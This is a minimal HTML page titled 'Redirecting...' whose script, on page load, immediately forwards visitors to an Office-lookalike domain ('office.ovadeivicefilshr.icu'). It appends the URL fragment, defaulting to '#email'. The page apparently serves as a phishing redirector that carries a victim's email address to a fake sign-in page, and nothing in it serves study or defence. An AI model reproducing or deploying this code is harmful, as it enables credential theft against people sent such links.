<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Define the base URL to redirect to
            var baseUrl = "https://office.ovadeivicefilshr.icu/CgFHgEUV";
            
            // Grab the fragment identifier from the current page URL (if exists)
            var fragment = window.location.hash || "#email";  // Default to #email if no fragment is present
            
            // Construct the full URL with the fragment identifier
            var fullUrl = baseUrl + fragment;
            
            // Redirect immediately
            window.location.href = fullUrl;
        });
    </script>
</head>
<body>
    <!-- The body content can remain empty since we don't need to display anything -->
</body>
</html>
